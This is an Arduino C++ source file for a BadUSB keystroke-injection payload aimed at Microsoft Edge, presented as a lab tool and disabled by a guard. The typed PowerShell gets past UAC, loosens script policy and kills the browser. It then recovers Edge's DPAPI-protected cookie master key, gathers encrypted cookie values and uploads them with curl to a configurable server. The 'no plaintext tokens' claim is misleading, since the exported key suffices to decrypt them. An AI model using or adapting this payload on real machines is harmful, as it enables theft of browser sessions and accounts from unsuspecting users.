// CookieStealer.cpp — Microsoft Edge variant
//
// BadUSB payload (TinyScreen+ / Arduino Keyboard) for the authorized lab.
//
// HALF-STEP DEMO: recovers the DPAPI-protected AES master key from Edge's
// Local State (proving the key is unwrappable by the logged-in user) and
// enumerates the cookie database WITHOUT decrypting any individual cookie.
// No plaintext session tokens are produced.
//
// The report is ZIPped and POSTed to TraceHub so it lands in the Loot Log.
//
// Dependencies for a firmware build:
//   - CookieStealer.h     (declares sendCookieStealerKeys)
//   - BadUsbPayload.h     (BadUsbProgress struct)
//   - DisabledPayload.h   (showDisabledPayload guard)
//   - Arduino Keyboard library
//
// Build with -DTRACEHUB_SERVER_IP=<ip> to point the exfil at your TraceHub.

#include "CookieStealer.h"
#include <Keyboard.h>
#include "../../DisabledPayload.h"

#define TRACEDECK_STRINGIFY_LITERAL(value) #value
#define TRACEDECK_STRINGIFY(value) TRACEDECK_STRINGIFY_LITERAL(value)

namespace {
    // Delay for the Windows Run dialog to appear after Win+R.
    constexpr uint32_t kRunDialogWaitMs = 1000;
    // Delay for the UAC prompt to appear after Ctrl+Shift+Enter.
    constexpr uint32_t kUacPromptWaitMs = 500;
    // Delay for the elevated PowerShell window to open after accepting UAC.
    constexpr uint32_t kAdminWindowWaitMs = 1500;
    // Delay for Install-Module PSSQLite to finish (needs internet).
    constexpr uint32_t kSetupWaitMs = 8000;
    // Delay after closing the browser so the cookie DB lock is released.
    constexpr uint32_t kBrowserCloseWaitMs = 1500;
    // Delay for the key recovery + report generation.
    constexpr uint32_t kReportWaitMs = 2000;
    // Delay for the ZIP + upload step.
    constexpr uint32_t kExfilWaitMs = 2000;
    // Total delay budget across the sequence.
    constexpr uint32_t kTotalMs = kRunDialogWaitMs + kUacPromptWaitMs + kAdminWindowWaitMs +
                                  kSetupWaitMs + kBrowserCloseWaitMs + kReportWaitMs + kExfilWaitMs;
    // Refresh the progress bar every 125 ms, matching the other payloads.
    constexpr uint32_t kProgressRefreshMs = 125;

#ifdef TRACEHUB_SERVER_IP
    constexpr char kTraceHubUploadUrl[] =
        "http://" TRACEDECK_STRINGIFY(TRACEHUB_SERVER_IP) ":8080/badusb/upload";
#else
    constexpr char kTraceHubUploadUrl[] = "http://192.0.2.1:8080/badusb/upload";
#endif

    struct TimedProgress
    {
        const BadUsbProgress &progress;
        uint32_t totalMs;
        uint32_t completedMs;

        void wait(uint32_t duration)
        {
            const uint32_t startedAt = millis();
            uint32_t elapsed = 0;
            while (elapsed < duration)
            {
                const uint32_t remaining = duration - elapsed;
                delay(remaining < kProgressRefreshMs ? remaining : kProgressRefreshMs);
                elapsed = millis() - startedAt;
                const uint32_t waited = elapsed < duration ? elapsed : duration;
                // Reserve a full bar until the keyboard sequence returns.
                progress.update(progress.context, (completedMs + waited) * 99 / totalMs);
                elapsed = millis() - startedAt;
            }
            completedMs += duration;
        }
    };

    void pressShortcut(uint8_t modifier, uint8_t key)
    {
        Keyboard.press(modifier);
        Keyboard.press(key);
        Keyboard.releaseAll();
    }
}

void sendCookieStealerKeys(const BadUsbProgress &progress)
{
    // Comment out BOTH lines below to enable this payload.
    showDisabledPayload(progress);
    return;

    TimedProgress timing{progress, kTotalMs, 0};
    Keyboard.begin(KeyboardLayout_en_US);

    // Open an elevated PowerShell prompt: Win+R, powershell.exe, Ctrl+Shift+Enter, then Alt+Y to accept UAC.
    pressShortcut(KEY_LEFT_GUI, 'r');
    timing.wait(kRunDialogWaitMs);
    Keyboard.print("powershell.exe");
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    timing.wait(kUacPromptWaitMs);
    pressShortcut(KEY_LEFT_ALT, 'y');
    timing.wait(kAdminWindowWaitMs);

    // 1. Allow scripts, install and import PSSQLite.
    Keyboard.print("Set-ExecutionPolicy -Force -ExecutionPolicy Unrestricted; Install-Module -Scope CurrentUser PSSQLite -Force; Import-Module PSSQLite;");
    Keyboard.write(KEY_RETURN);
    timing.wait(kSetupWaitMs);

    // 2. Close Edge so the cookie database is no longer locked.
    Keyboard.print("Get-Process -Name msedge -ErrorAction SilentlyContinue | Stop-Process -Force;");
    Keyboard.write(KEY_RETURN);
    timing.wait(kBrowserCloseWaitMs);

    // 3. Unwrap the DPAPI AES key, enumerate cookies, and build a clean report.
    Keyboard.print("Add-Type -AssemblyName System.Security; $s = Get-Content \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Local State\" -Raw | ConvertFrom-Json; $b = [Convert]::FromBase64String($s.os_crypt.encrypted_key); $k = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser); ");
    Keyboard.print("$c = @(Invoke-SqliteQuery -DataSource \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies\" -Query \"SELECT host_key,name,encrypted_value FROM cookies\"); ");
    Keyboard.print("$r = @(); $r += \"Recovered AES key (hex): \" + (($k | ForEach-Object { $_.ToString('X2') }) -join ''); $r += \"Cookies enumerated: \" + $c.Count; $r += \"Sample (still encrypted):\"; ");
    Keyboard.print("$c | Select-Object -First 5 | ForEach-Object { $r += \"  $($_.host_key) | $($_.name) | encrypted=\" + [Convert]::ToBase64String($_.encrypted_value) }; ");
    Keyboard.print("New-Item -ItemType Directory -Force \"$env:TEMP\\Test_Important\" | Out-Null; $r | Out-File \"$env:TEMP\\Test_Important\\CookieReport.txt\" -Encoding utf8;");
    Keyboard.write(KEY_RETURN);
    timing.wait(kReportWaitMs);

    // 4. ZIP the report and upload it to TraceHub (Loot Log).
    Keyboard.print("Compress-Archive -Path \"$env:TEMP\\Test_Important\" -DestinationPath \"$env:TEMP\\Test_Important.zip\" -Force; $sid=[guid]::NewGuid().ToString(); curl.exe -s -F \"submission_id=$sid\" -F \"file=@$env:TEMP\\Test_Important.zip\" \"");
    Keyboard.print(kTraceHubUploadUrl);
    Keyboard.print("\";");
    Keyboard.write(KEY_RETURN);
    timing.wait(kExfilWaitMs);
}
